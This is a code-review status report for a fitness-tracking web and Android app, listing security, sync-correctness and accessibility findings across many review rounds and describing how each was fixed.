# Code review and status

Review of the app at commit `108ba0b` (v2.9.1), with the status of every finding after the v3.0.0 rework on the `modernize` branch (rebased onto upstream `a30a7ff`, v2.12.0, and merged with upstream `79dace5`, v2.12.4 (v2.12.4 only bumps the version): v2.12.3's chip-scrolling fix and drag-to-reorder are ported to the modular app; drag uses a grip handle and the up/down buttons stay as the tap and keyboard alternative).

Upstream v2.12.0 also starts publishing leaderboard stats automatically on every sync; v3.0.0 keeps sharing opt-in. Which behaviour the app should have is the owner's call.
The findings come from two independent passes: an Opus review of the frozen snapshot (full report below), cross-checked against my own read. Each was re-verified against the code.

## Status

| ID | Severity | Finding | Status |
|---|---|---|---|
| C1 | Critical | Recipient could rewrite requester_id and forge friendships | Fixed: column-level grant + guard trigger (migration 20261024000000); regression test in rls.test.js |
| H1 | High | Stored XSS via shared workouts | Fixed: all rendering goes through html`` escaping; shared routines sanitized; CSP forbids inline script; e2e XSS test |
| H2 | High | No decline/cancel/unfriend; usernames enumerable | Fixed: delete policy + UI, exact-match find_profile(), profiles readable only by related users, 20 requests/day limit |
| H3 | High | Next account absorbs previous user's data | Fixed: account-switch prompt (replace keeps a local backup), optional data removal on sign-out; e2e test |
| H4 | High | supabase-js from CDN, floating version, no SRI | Fixed: vendored pinned 2.118.0 (vendor/supabase.js); CSP blocks remote scripts |
| H5 | High | Signing key committed with public passwords | Fixed: committed key removed; a GitHub Actions workflow creates a private key and a signed rotation from the old key (APK v3 key rotation), so users update without reinstalling and the old key is refused on Android 9+; signer verified when signing and again before publishing (README → Android signing) |
| H6 | High | CI write token exposed to unpinned install scripts | Fixed: read-only build job, separate publish job on main only, actions pinned by SHA, Capacitor from a lockfile with --ignore-scripts, pillow pinned |
| M1 | Medium | Deletions resurrected by sync | Fixed: synced session tombstones and cleared dates (the format upstream adopted on 2026-10-23), weigh-in delete queue, plan tombstones resolved by the newer side; unit + e2e tests incl. interop with upstream's format |
| M2 | Medium | Whole-document last-writer-wins uploads | Fixed: every upload is read-merge-write with compare-and-set on updated_at (retried up to 3 times); plans merge per routine and weekday against the last-synced base |
| M3 | Medium | One bad weigh-in breaks weight sync | Fixed: input limited to 20–350 kg, sanitized list, only changed rows upserted |
| M4 | Medium | Crash when the active workout was deleted | Fixed: exercise list snapshot at open; rebuilds from draft/log; stale active state cleared |
| M5 | Medium | Unvalidated copied workouts (freeze/crash/overwrite) | Fixed: sanitizeWorkout clamps all fields; copy asks for a name and refuses existing names; DB size check |
| M6 | Medium | hydrate runs repeatedly with UI side-effects | Fixed: one sync per sign-in (not on token refresh); editors don't re-render while typing |
| M7 | Medium | Friends can read full weight history and plans | Fixed: friend_summaries() returns latest weight (opt-in) and counts only; raw tables owner-only |
| M8 | Medium | Taken username creates an account that can't sync | Fixed: profile created by trigger with fallback name; username can be changed in Settings |
| M9 | Medium | Password reset never sets a new password | Fixed: PASSWORD_RECOVERY asks for a new password, and the app accepts the code from the reset email (the deploy workflow installs an email template with the code) |
| M10 | Medium | Published APK is a debuggable debug build | Fixed: release builds are non-debuggable (webContentsDebuggingEnabled false, assembleRelease); debug builds are only for tests |
| M11 | Medium | Delete removes the whole day; 'log again' overwrites | Fixed: per-session delete; re-opening a logged workout is labelled 'View or edit' / 'Save changes' |
| M12 | Medium | Backup misses plans; restore unvalidated | Fixed: all keys, versioned format, JSON validated, data sanitized on load; old format still accepted |
| M13 | Medium | Weights silently rounded to 5 kg | Fixed: exact by default; rounding step selectable in Settings |
| M14 | Medium | README privacy claims wrong | Fixed: README rewritten to match behaviour |
| M15 | Medium | No self-service deletion / privacy notice for minors | Fixed: sign-up requires confirming age 14+ or parental permission (recorded with the account), in-app privacy notice, self-service account deletion, block, weight opt-in |
| L1 | Low | Usernames derived from email | Fixed: no email-derived names; random fallback |
| L2 | Low | Self-reported leaderboard; 'Refresh' publishes | Fixed: friends' totals (workouts, kg × reps, time) are computed in the database from synced history; only the streak is app-reported. Buttons say Share/Update/Stop sharing |
| L3 | Low | Fragile update detection | Fixed: the updater compares build numbers (release title carries the run number, the app reads its versionCode); the web check only offers newer versions |
| L4 | Low | Stale assetlinks.json | Fixed: removed |
| L5 | Low | Version string in five places | Fixed: js/version.js + Version + sw.js, checked by a unit test |
| L6 | Low | Start-up normalisation overrides edits | Fixed: one-time upgrade; defaults only for missing fields |
| L7 | Low | Duplicate exercise names collide | Fixed: duplicates dropped on sanitize; the editor prevents adding them |
| L8 | Low | Prototype-key workout names | Fixed: __proto__ rejected; Object.hasOwn checks |
| L9 | Low | Oversized DOM, always-on timers, chatty sync | Fixed: 14-day upcoming list (expandable), calendar to +6 months, active-bar timer only while a workout runs, debounced sync with skip-if-unchanged |
| L10 | Low | Dead code, duplication, CSS overrides | Fixed: monkey-patch layer removed; one stylesheet; one escaper |
| L11 | Low | Schema hygiene | Fixed: original policies re-created with (select auth.uid()) (20261024000003), new tables follow the same pattern |
| L12 | Low | Tests fail and only grep strings | Fixed: unit, RLS integration, browser e2e and Android emulator suites |

All findings are fixed in code. What remains for the app's owner is configuration in GitHub: the secrets for the database deploy and a single run of the signing setup workflow (README → Database setup, Android signing).

## Critique rounds

After the rework, three independent Opus reviews (security/privacy, data correctness, UX/accessibility/tests) rated the branch and listed findings. Every critical, major and minor finding and every nit was fixed and re-reviewed.

### Round 11 (security 7.5/10, correctness 8.5/10, UX/tests 7/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| S11-01 | Major | A new routine kept its raw markup name when the defused name was taken | A taken defused name gets a number; the raw name is never kept; test |
| UX-M1, m4 | Major/Minor | A slow Share replaced a newer Undo; Share could be repeated | Share runs inside its prompt ("Saving…", once); late server answers (act results) are background messages that wait behind an Undo |
| UX-M2 | Major | "Forgot password?" opened its code sheet whenever the server answered | Each step waits inside its own prompt, so nothing opens later while the user is elsewhere |
| UX-M3 | Major | The prompt lock was tested on one of five close paths | The test tries Escape, Cancel, Close, the backdrop and Back while saving, and checks the unlock after a refusal; each part checked against its removal |
| mi-1 (correctness) | Minor | Defusing after a sign-out changed the user's own text the account knew | Only text the account does not have anywhere is defused; workouts the account deleted are left alone |
| mi-2 (correctness) | Minor | Cutting names could split an emoji, making the database refuse every plan sync | All cuts go through cut() (whole characters); test |
| S11-02..S11-06 | Minor | Ended session while the app was closed, running workout escaping defusing, deletions on an empty phone, future workout times, no way to end other sessions | Such sessions mark the phone untrusted at the next start; drafts and the running workout follow renames; deletions count as data on the phone; future times count as oldest; "Sign out on all devices"; tests |
| UX-m1..m3 | Minor | Background messages dropped behind an error or each other, a silent saving prompt, a sent request clearing the next name | Background messages queue behind an Undo or error; a saving prompt says "Saving…" in its status line, makes the field read-only and marks Cancel and Close unavailable; the field is cleared only if unchanged; tests |
| S11-N1, n-1 | Nit | Documentation, replied dates above 200 | README and this table describe exactly what happens; replied dates above 200 remain out of practical reach |

### Round 10 (security 7/10, correctness 8/10, UX/tests 7/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| S10-01 | Major | A changed note or target on an exercise the account already had passed undefused | Anything not exactly as the account has it (exercise, workout, lift) is defused; test with a restored note |
| MA-1 | Major | Workouts of routines with names over 40 characters had their name cut, so Today offered the workout again | Workout names keep up to 200 characters like routine names; the Copy prompt starts at 40; test |
| UX-M1 | Major | An update found in the background replaced an Undo | Background announcements wait; only a requested check answers at once; test |
| UX-M2 | Major | Round-9 UX fixes untested | Tests for retries that leave focus where the user moved to (Crew and Settings), per-month calendar memory, the busy update button, a prompt saved once, and a later check reporting a waiting update; each checked against its removal |
| UX-M3 | Major | Cancelling a prompt while it saved still saved, silently | A saving prompt shows "Saving…" and can't be closed until the result is in; test |
| S10-02 | Minor | A sign-out elsewhere left the phone trusted, and Sign out signed out every device | Sign out ends this device's session only; any ended session marks later data as untrusted |
| S10-03, S10-04 | Minor | Edited workouts via a backup; a backup's cleared days wiped history | Covered by S10-01; restores don't take deletion records, and future cleared-day times are ignored; test |
| mi-1, n-1, m1, S10-05 | Minor/Nit | Gym dates with a long routine name, replied dates over 100, update wording, README | The routine name sent with a date is cut to 40; replied dates are filtered to upcoming open ones you don't host; wording fixed; README exact |
| Android test | — | The offline test sometimes relaunched before storage was written | It waits until WebView storage has been unchanged for two seconds |

### Round 9 (security 8/10, correctness 7.5/10, UX/tests 7/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| MA-1 | Major | Names with spaces at either end or over 40 characters were trimmed or cut, duplicating routines in the original app | Stored names are kept whole; only this app's own prompts trim and limit typing; test |
| UX-M1 | Major | A successful "Try again" pulled focus from wherever the user had moved | The notice stays while retrying; focus moves only if the user is still on it |
| UX-M2 | Major | Ten round-8 behaviours untested; the gym-date test could not fail | Tests for the heartbeat (3 minutes on a fake clock), a failed sign-in, request sizes, "Reload now", offers while Settings is open, retries with another tab's old error, the calendar tab stop, the Accept name, .btn-danger; each checked against its removal |
| S9-01..S9-03 | Minor | Shared-phone data: foreign exercises in a known routine, additions after a sign-out that kept the data, and the previous person's deletions | Exercises new to a known routine are defused; data added after such a sign-out is distrusted at the next sign-in; an unowned join clears earlier deletions and edit times first; tests |
| mi-1 | Minor | Defusing still renamed own backups, routines the account deleted, merged workouts | Restores keep names and are defused at sync only where new; deleted names count as known; defusing runs after the merge protection; test |
| mi-2 | Minor | First sign-in let the account's older cleared days delete workouts it never saw | Joined workouts are protected from cleared days unless the account deleted their key |
| UX-m1..m4 | Minor | A taken username closed the prompt, no busy state on "Download and install", misleading update announcements, calendar memory per calendar | Prompts can save on the server and stay open on a refusal; the update button is busy while it works; announcements fit where the user is and a second check says so; the visited day is remembered per month |
| S9-N1..N3, n-1, n-2, UX nits | Nit | Lax shape check, unvalidated size check, targets and sets not defused, README wording, replied dates beyond 200, draft prefix, heading choice, banner leftovers | Strict shape check and validated size check; targets and sets defused too; README exact; replied dates always load; drafts matched by their routine; focus goes to the heading just above the row; banner names removed |

Remaining by design: a weigh-in without a timestamp from a phone joining an account stays deleted if the account deleted that day (weakening this would bring back weigh-ins deleted elsewhere for everyone upgrading from the original app).

### Round 8 (security 8.5/10, correctness 7/10, UX/tests 6.5/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| MA-1 | Major | A "|" in a routine name became "/", duplicating routines in the original app | Names keep "|"; draft keys are handled by prefix |
| MA-2 | Major | Defusing rewrote the user's own names on restore and on every upgrade's first sign-in | Backups and joining data only defuse "<" before a letter (the original app puts names into page text, never attributes); data joining an account is defused only for routines, workouts and lifts the account does not have yet, so an upgrading phone keeps its names; test |
| S8-01 | Minor | Someone else's data on a shared phone joined an account without defusing | As above: what is new to the account is defused; test |
| S8-02 | Minor | Shared routines were checked for markup but not shape | Database refuses entries that are not exercises or have absurd set counts; existing bad shares are removed; test |
| S8-03 | Minor | Renaming revealed which usernames exist, without limit | Renames go through change_username(), which shares the 30-an-hour lookup budget; other updates keep the username silently; test |
| UX-M1 | Major | The floating update banner covered every screen's header | No banner: updates are offered in Settings and announced once; test |
| UX-M2, n-3 | Major/Nit | The other tab asked again after two minutes | The signing tab announces itself until its session starts; a failed sign-in clears it |
| UX-M3 | Major | Restoring one's own backup still duplicated routines with quotes | Quotes are no longer changed (see MA-2) |
| mi-1 | Minor | More than ~200 visible gym dates made the list fail (URL too long) | Detail queries go in chunks; test with 80 dates |
| UX-m1..m5 | Minor | Focus moved to the same action for the next person, stale retry error, prompts undescribed, calendar tab stop, untested claims | The fallback skips same-action and destructive controls and goes to the section; Accept names the person; retries report only what they loaded and return focus to the section; prompt fields are described by their hint; the calendar remembers the last-visited day; tests for each |
| n-1, n-2, S8-N1, S8-N2, UX nits | Nit | Own shares beyond the newest 50, a superseded account start, client-set share dates, take-back message, banner wording, focus after retry, .btn-danger | Own shares always load; a start superseded by another sign-in restarts for it; shares are dated by the server; the message mentions friends may have seen it; handled as above |

### Round 7 (security 8/10, correctness 7/10, UX/tests 6.5/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| R7-01 | Major | The markup cleaner looped forever on a null plan or history, tying up the database | Superseded: the cleaner is gone (see MA-1); a null plan is refused at once; test |
| MA-1 | Major | Renaming markup characters in names duplicated routines and workouts in the original app, which identifies them by name | Own routine and workout names stay exactly as typed; only shared routines are refused when they carry markup, and the rest picture must be image data |
| UX-M1 | Major | The other tab asked the account question again (it checked before the signing tab said it was asking) | The signing tab announces itself from the form submit until its session starts; others wait only while it does; test with a positive signal |
| UX-M2 | Major | Tab left the dialog and reached the toast's Undo | The Undo is inert while any dialog is open; test |
| UX-M3 | Major | Restoring one's own backup renamed "Arms <3" and duplicated routines | Backups only defuse tag-like markup and quotes; names like "Arms <3" stay; test |
| R7-02 | Minor | "Gym date not posted." could be untrue | The message follows whether taking the date back worked, and a failed or timed-out post says to check Crew; test |
| mi-1 | Minor | The gym-date list loaded at most 100 dates including cancelled ones | Open dates only (up to 200) plus all of the user's own |
| UX-m1..m5 | Minor | Try again moved focus and failed silently, sign-out put focus on Delete, Calendar tab stop reset, update banner pushed the page, round-6 claims untested | Try again stays in place while busy and reports its result; the fallback never picks a destructive control; the chosen day keeps the tab stop; the banner floats and is announced once; tests for each claim |
| n-1, n-2, UX nits | Nit | Waiting after a reload, corrections at the weigh-in cap, Escape in a workout, whole-body descriptions, stale comment | Wait only while another tab asks; corrections allowed; Escape dismisses the Undo first; dialogs described by their lead sentence; comment fixed |

### Round 6 (security 8.5/10, correctness 7/10, UX/tests 7/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| MA-1..MA-3, mi-1 | Major/Minor | The round-5 markup checks refused whole plans or histories (rest picture "rest.png", "Arms <3", old deleted names, trailing backslashes) | Plans and history are cleaned by a database trigger instead (markup becomes look-alikes, non-image rest pictures are dropped); only shared routines are refused; the app makes the same substitution and cleans stored tombstone names; tests |
| mi-2, n-1 | Minor/Nit | Notes rewritten silently, quote in a share title refused with a raw error | Look-alike characters keep the meaning (RPE ‹8); share titles are cleaned before sending |
| UX-M1 | Major | A background render turned the focused Share button into Delete | Unkeyed controls only match if they do the same thing (data-* attributes); editor header keyed; plan re-renders on account changes; renderer test |
| UX-M2 | Major | A keyed card going away re-created the unkeyed element after it | Unwanted keyed nodes are removed before matching; renderer test |
| UX-M3 | Major | Every tab asked "Someone else used this phone" | Only the tab that signed in asks; the others wait for its answer; test |
| UX-M4 | Major | The keyboard-sticky Undo held back messages, outlived its screen and ran under dialogs | Sticky Undo removed: the user's next result replaces it, background messages wait; it goes on page change and when the workout closes; Ctrl/Cmd+Z and Escape are ignored while a dialog is open; tests |
| UX-M5 | Major | Round-5 behaviours could be removed with tests green | Renderer spec (each rule checked by mutation), tests for described dialogs, stacked sheets, show more days, toast vs rest timer, Undo shortcut rules, background messages, the status line |
| R6-01 | Minor | Count limits beaten by parallel requests | Per-account advisory locks; test with 40 parallel posts |
| R6-02 | Minor | Shared routines with markup survived the deploy | Deleted in the migration, then the constraint is validated |
| UX-m1..m6 | Minor | Moving a focused keyed card blurred it, "Keep it" lost typed text, Cancel while posting still posted, confirm dialogs not described, Calendar "Today" left focus behind, Undo focus ring contrast | The focused node stays and the others move; typed text kept and editor reopened; a date posted after Cancel is taken back; every sheet with a body is described; focus goes to today's cell; focus ring in the text colour |
| R6-N1, R6-N2, n-2, n-3 | Nit | Access check by name only, quotes in times and legacy ids, restore wording, legacy deletions | Signatures, views and live-update tables checked, README states its limits; times must be timestamps and legacy ids are hashes; restore dialog says routines return to the backup; legacy deletion limit documented |
| UX nits | Nit | Background errors announced as alerts, waiting service worker never offered, fixed sleep in a test | Crew errors are not live regions; a waiting update shows "Update ready"; the test waits for the profile |

### Round 5 (security 7.5/10, correctness 8/10, UX/tests 7.5/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| R5-01 | Major | The database still accepted markup in shared routines, plans and the rest picture, which the original app runs | Database checks refuse markup characters in shared routines, plans and logs, and anything but image data as rest picture (20261024000005); this app strips those characters before saving; tests |
| UX-M1 | Major | The username prompt reopened at every start and in every tab | Asked once, in the tab where the user just signed up; test |
| UX-M2 | Major | Unkeyed sections made the renderer re-create what lay below them | Crew sections and lift cards are keyed, and the renderer looks a few elements ahead for a removed unkeyed one; tests assert the focused node itself survives |
| UX-M3 | Major | Focus tests passed with a re-created copy | Tests hold the focused node and count blur events; checked against removed keys |
| R5-02 | Minor | Stats card said "update after training" though totals are live | Card, privacy notice and README say the totals update after each synced workout and show when and how long someone trained |
| R5-03 | Minor | Limits skipped shared routines and gym dates | 50 shared routines per account; 20 gym dates a day and 30 upcoming per host; test |
| mi-1, mi-3 | Minor | Restored or merged-in workouts on a day cleared in the original app were deleted again | They get the current time (and a derived id), so both apps keep them |
| mi-2 | Minor | Restore did not bring back routines deleted since | Restored routines and the week are stamped as changed now and leave the deleted list |
| mi-4 | Minor | Two tabs both asked "Someone else used this phone" | An answer in one tab closes the question in the others and is the one that counts |
| UX-m1..m8 | Minor | Success dropped after an error, last "Show more days", routine deleted elsewhere, Undo reach, toast over the rest timer, prompt not described, deleted-account prompt, stacked sheets | Only background messages yield to an error; focus goes to the first new day; a message with "Keep it"; Undo stays for keyboard users and Ctrl/Cmd+Z runs it; toast above the rest bar; aria-describedby on required prompts; a "Keep the workouts from the deleted account?" question; a lower sheet closing keeps the upper one modal |
| n-1, n-2 | Nit | Long legacy keys cut, weigh-ins lost with a fast phone clock | Legacy keys kept whole; the server reports each weigh-in's outcome, and dates it refuses stay on the phone |
| R5-N1..N4 | Nit | Block detectable, previous user's extras moved silently, PKCE row after deletion, no check of the live policies | Wording corrected; those extras count as data on the phone; the row is deleted; 20261024000006 stops the deploy on unknown policies or callable functions |
| UX nits | Nit | Status announcements, focus after deletion, cache not refreshed without a version bump, live set counters | Background status is silent ("Sync now" reports its result); focus goes to the sign-in form; sw.js carries a content hash checked by a test (`npm run sw-hash`); one status line announces the changed set count |

### Round 4 (security 8/10, correctness 7.5/10, UX/tests 7/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| MA-1 | Major | More than 1000 weigh-ins: rows past the server's page looked deleted | Read page by page until an empty page; dates the server refuses stay local; e2e test with 1,100 entries and two syncs |
| MA-2 | Major | Sign-out offline with an expired token kept the stored session | When supabase-js fails to sign out, the session is removed locally; e2e test |
| UX-M1 | Major | A background toast replaced a focused Undo | Messages wait while an Undo is shown; replacing a focused toast returns focus first; e2e test |
| UX-M2, UX-M4 | Major | Disappearing teaser, other tabs and devices re-targeted focus (Today, routines, calendar, running bar) | Keyed rows and sections on Today, Plan and Calendar; the bar hands focus to the page before hiding; e2e tests |
| UX-M3 | Major | Signing in on one tab asked the question in the others, and dismissing it signed out everywhere | The in-app sign-in marker is shared by tabs and the owner is re-read before asking; the question must be answered and says what happened; e2e tests |
| mi-1, mi-2 | Minor | Restores lost days cleared by the original app, and repeated restores duplicated sessions | Cleared days no longer hide restored sessions; re-keyed ids follow from the old key; e2e test |
| mi-3 | Minor | Any old deletion dropped non-fresh weigh-ins | Only copies older than the deletion are skipped; merged-in weigh-ins count as new where the account has none; test |
| R4-01 | Minor | Privacy notice understated who sees replies and check-ins | Notice, card text and README say the host and your friends who see the date see them by name |
| R4-02 | Minor | No storage limits | Size limits on plans (1 MB) and workout data (8 MB), weigh-in dates 1900 to today, 20,000 weigh-ins per account; test |
| UX-m1..m8 | Minor | Undo suppressed after errors, heading fallback, settings view swap, navigation focus, invisible close icon, clipped email, "Keep my data" left signed in, test gaps | Undo never suppressed; fallback to previous rows and the section heading; stable settings view with a keyed account card; focus moves with page changes and back to the settings button; close icon drawn; long emails wrap; "Not synced yet" offers keep / remove / stay with a message; tests added and checked against the old code |
| R4-N1..N5 | Nit | Rate-limit rows after deletion, block detectable, admin token job-wide, setup check failed open, CSP allowed GitHub on the web | Rows deleted with the account; requests to a blocker are dropped silently; token step-scoped; check fails closed; GitHub only in the Android build's CSP |
| UX nits | Nit | Stale alert region, dead rest-day buttons, dead code, untested update check | Alert cleared with the toast; rest days are plain rows; allKeys removed; update comparison moved to js/domain/release.js with unit tests |

### Round 3 (security 6.5/10, correctness 7/10, UX/tests 6.5/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| R3-01 | Major | A link carrying someone's session signed the web app in and uploaded local data | PKCE sign-in (links work only in the browser that asked); an unexpected account is named and asked before any upload; e2e test |
| MA-1, mi-3 | Major/Minor | Weigh-ins deleted elsewhere came back; slow phone clocks reverted corrections | save_my_weights skips deleted dates unless the entry was changed on that phone; such entries win locally until uploaded, then take the server time; tests |
| MA-2 | Major | More than 400 weigh-ins never synced | Uploads in batches of 200; e2e test with 450 |
| MA-3 | Major | A sync in flight undid "Sign out and remove my data" | Syncs started before sign-out, deletion or another sign-in no longer write to the phone; queued uploads are dropped; e2e test |
| UX-M1..M3 | Major | Controls disabled while focused dropped focus (picks, share-weight, unblock, post) | Busy controls stay focusable (aria-disabled); render() treats a disabled focused control as lost; e2e tests |
| UX-M4 | Major | Focus tests passed with the fix removed | tests/e2e/focus.spec.js (8 cases), checked to fail against the reverted renderer |
| R3-02 | Minor | Hosts could move or retarget a date after replies | Only cancelled_at is updatable, and a cancelled date stays cancelled; test |
| R3-03 | Minor | Rotation left the public key with permission, shared-uid and auth rights | Shared uid, auth and rollback removed; the permission capability must stay (the update is refused without it, tested on Android 15), documented |
| R3-04 | Minor | Key backup protected by a passphrase in a public artifact | Encrypted to the owner's certificate; artifact kept 1 day |
| R3-05, R3-N3 | Minor/Nit | Repository-level secrets bypassed the production approval | Environment secrets, branch-limited environment; deploy secrets only in the steps that use them, password never on the command line |
| mi-1 | Minor | A tab with a workout open overwrote another tab's data | Other tabs' changes load immediately, also during a workout; e2e test |
| mi-2 | Minor | Drafts from "Log another workout" were unreachable | Fresh opens continue an unsaved draft of that workout and day; e2e test |
| mi-4 | Minor | Restored sessions deleted since were dropped again | Restored sessions that the account deleted since get new ids; restored weigh-ins count as changed here |
| mi-5 | Minor | Gym dates misfiled on daylight-saving days | Calendar arithmetic; unit test in Europe/Berlin |
| UX-m1..m7 | Minor | Check-in focus, tab switch focus, closing from the active bar, Undo timing, unkeyed weigh-ins, polite errors, desktop test contexts | Focus stays on the check-in confirmation and on the tabs, returns to the active bar; the toast holds while focused and returns focus; keyed rows; separate alert region; Pixel 7 contexts |
| R3-N1, N2, N4, N5 | Nit | Android 6 wording, settings "sync", self-referential hash check, table extras | Docs and comments corrected, privacy notice lists what syncs, hash check dropped, TRUNCATE/REFERENCES/TRIGGER/MAINTAIN revoked; test |
| UX nits (4) | Nit | Weight field kept its value, aria-label on a span, chip tab stops, stepper names | All fixed |

Upstream limits (not fixable in this client): an old-app device re-publishes leaderboard stats after "Stop sharing", and re-uploads routines that were deleted and re-created. A session without id and time (only from foreign imports) that is deleted in this app stays in the original app, which keys it by its full JSON.

### Round 2 (security 7/10, correctness 6/10, UX/tests 6/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| C-1 | Critical | Editing a logged session rebuilt it from the current routine | The editor shows exactly the exercises that were logged; no last-used prefill; e2e test |
| M-1 | Major | Unsaved new sessions couldn't be reopened | Opening a day without a key resumes its newest unsaved draft; e2e test |
| M-2 | Major | Today kept yesterday's date after midnight | Redraw on visibility change and at midnight; buttons read the date when tapped |
| M-3 | Major | Full storage lost a finished workout | The save is checked; on failure the workout stays open with an error |
| UX-M1/M2/M3 | Major | Background refreshes and pending states dropped focus | render() never moves a focused node; focus goes to the same or next row's control, then the heading; pending controls use aria-disabled; e2e tests |
| UX-M4 | Major | Reset by code opened two password sheets | Only Supabase's own recovery event opens it |
| UX-M5 | Major | Switching Sign in / Create account lost the form | One stable form view with tabs; typed values survive |
| UX-M6 | Major | A taken username silently became a random one | The app detects it and asks for another name |
| UX-M7 | Major | APK published without waiting for tests | Release runs only after the Tests workflow passed on main |
| m-1, UX-m9/m10 | Minor | Plan editor edits landed on the wrong exercise; moves lost focus | Controls find their exercise by name; focus follows the moved row; e2e test |
| m-2, m-3 | Minor | Merging an account dropped routines; a missing cloud plan wiped the local one | Tombstones cleared on merge; a missing row means "no base" |
| m-4 | Minor | Re-entered weigh-in dropped by server tombstone | Weigh-ins saved through save_my_weights() with server time |
| m-5, m-6 | Minor | Rebuilt sessions lost details; "last used" after midnight | Details from the log; last-used decided when the session opens |
| m-7 | Minor | Deleted sessions unrecoverable | Undo restores a deleted session under a new id |
| m-8 | Minor | Two tabs overwrote each other | Storage events reload state from the other tab |
| m-9 | Minor | AbortSignal.timeout missing on older WebViews | AbortController with a manual fallback |
| m-10, m-11 | Minor | Rest-image timestamp reset; old app couldn't restore new backups | Timestamp kept; backups also carry the old top-level keys |
| R2-01, R2-02 | Minor | Request and lookup limits raceable or bypassed by resending | Append-only request log; both limits under an advisory lock; tests |
| R2-03 | Minor | Blocking left gym-date replies behind | Unfriend and block remove replies and invites between the pair; test |
| R2-04, R2-05 | Minor | Signing key exposed to build code; forced reinstall | Unsigned build job, separate signing job; v3 key rotation from the old key |
| R2-06 | Minor | Consent record rewritable, not enforced | Stored in a private table; sign-up without it is refused |
| R2-07 | Minor | Account deletion left the email in the audit log | The user's audit entries are deleted too |
| R2-08 | Minor | Block list showed the previous account's blocks | Loaded per user with a guard; error and retry |
| R2-09, UX-m8 | Minor | Privacy notice understated what friends see | Full list in the notice, consent text and README |
| R2-10 | Minor | allowBackup copied the session token to Google backups | allowBackup false and data-extraction rules exclude everything |
| R2-11 | Minor | GitHub Pages origin shared with the account's other sites | Hosting decision for the owner; documented in README (Hosting limit) |
| R2-12 | Minor | Dev server path bypass, no Host check | Allowlist of shipped files, normalized paths, Host check |
| UX-m1..m7 | Minor | Typed text overwritten, view focus, sign-out and delete progress, block-list errors, toasts, stacked sheets | Fields keep user text unless the app changed them; view changes focus the heading; busy states; error toasts stay longer and are announced; Escape closes only the top sheet; unique ids |
| UX-m11..m13 | Minor | "− Set" deleted filled rows, low-vision tab contrast, calendar tab stops | Undo for filled rows; accent indicator on the selected tab; one tab stop per month with arrow-key grid navigation |
| UX-m14..m17 | Minor | Test coverage and error tracking, publish race, "Now" dates expiring | Error tracking includes HTTP 5xx on every test; new suites (more.spec.js); release upload with --clobber; "Now" is recomputed when posting |
| R2-N1..N3 | Nit | Exposed helper, anon grants, inline styles | Helper revoked, anon revoked, CSP without 'unsafe-inline' and with Trusted Types |
| UX nits (16) | Nit | aria-label misuse, RSVP semantics, roving tabindex, dead code, sheet lookup, action order, copy, input hints, targets, contrast, sleeps and contexts, config, long names, reduced motion, shared-routine removal, Android PR check | All addressed (RSVP as a radio group, dead exports removed and nav derived from the router, sheets passed to their handlers, request rows stack below 400 px, Android project prepared on pull requests) |

Found while testing round 2: attribute snippets passed as plain strings were escaped by html``, which broke the sign-up form in the Android WebView. They now use html``, render() copies parsed attribute nodes, and a unit test rejects the pattern.

### Round 1 (security 6/10, correctness 5/10, UX/tests 5/10)

| ID | Severity | Finding | Fix |
|---|---|---|---|
| S-01 | Major | Realtime broadcast DELETEs of reply/invite rows (who joined which date) to every subscriber | Only gym_dates is published; reply/invite changes bump gym_dates.activity_at; dates are cancelled, never deleted; test checks the publication |
| S-02 | Major | Background sync ran before the account-switch question was answered | account.ready gate on every sync entry point; e2e test fires online/visibility events while the question is open |
| S-03 | Major | After "Delete my account" the next account absorbed the data silently | Deleted marker keeps the question; optional (default on) removal from the phone; e2e test |
| S-04 | Minor | Friend-request limit bypassable via client created_at | Trigger sets created_at to server time; limit counts all requests per day; test |
| S-05 | Minor | No blocking | friend_blocks table, enforced on requests and username lookup; block from Crew, unblock in Settings; tests |
| S-06 | Minor | Check-ins could be moved to another date | Trigger rejects date/user changes on replies; test |
| S-07 | Minor | "Remove my data" left gyms, photo, switch backup | All personal keys removed; switch backup can be saved as a file |
| S-08 | Minor | Unthrottled username lookup | 30 lookups/hour in find_profile; blocked users hidden; test |
| S-09 | Minor | Late crew results shown to the next user | Results dropped unless still the same user; state cleared on any account change |
| S-10 | Minor | CSP allowed any *.supabase.co | CSP lists the project host only; test servers/builds add the local address; unit test |
| S-11 | Minor | Unverified Pillow/Gradle downloads in the APK build | Icons pre-rendered and committed (no pip); Gradle dependency verification metadata; publish job re-checks checksum and signer |
| S-N1..N6 | Nit | anon grants, exposed helpers, plan counts without opt-in, broad file provider, weak download checks, wrong comment | anon revoked, helpers in an unexposed schema, counts only with published stats, cache-path only, content-type/size cap/signer check, comment corrected |
| CR-1 | Critical | Fresh device wiped the weekly schedule | Three-way per-item merge with a last-synced base; untouched local items never overwrite the cloud; test with full schedules |
| MA-1 | Major | Whole-plan timestamp reverted edits to other routines | Per-routine and per-weekday edit times |
| MA-2 | Major | Mixed old/new app use never converged | Base hashes detect changes from the old app (no timestamps needed) |
| MA-3/MA-4, UX-M2 | Major | Second session of a routine overwrote the first; one global draft slot | Session keys in drafts and the running-workout state; drafts per session; confirm before replacing a running timer; e2e test |
| MA-5, UX-M1 | Major | Future dates could be logged from Today | Future days open a preview; openSession refuses future dates; e2e test |
| MI-1 | Minor | Account switch carried old tombstones and weight bookkeeping | Bookkeeping reset on every account change |
| MI-2 | Minor | Re-entered weigh-in lost during a sync | A new entry is never treated as already uploaded |
| MI-3 | Minor | Old app re-uploaded deleted weigh-ins | Server-side tombstones ignore older re-uploads; test |
| MI-4 | Minor | Rest image dropped from the cloud plan | Synced as a plan item |
| MI-5 | Minor | Synced routines skipped the left/right upgrade | Upgrade runs when a plan is applied |
| MI-6, N-3 | Minor/Nit | Editing a past session overwrote "last used"; clearing values resurrected | Only new workouts logged today update last-used values; cleared values sync as empty entries |
| MI-7 | Minor | Editor threw when a sync removed the open routine | Editor closes when its routine disappears |
| MI-8, UX-m12 | Minor | Plan editor back entry outlived a tab switch | Pages get a leave hook; the editor closes its layer; e2e test |
| MI-9 | Minor | First service-worker install reloaded the page | Reload only for an update the user requested |
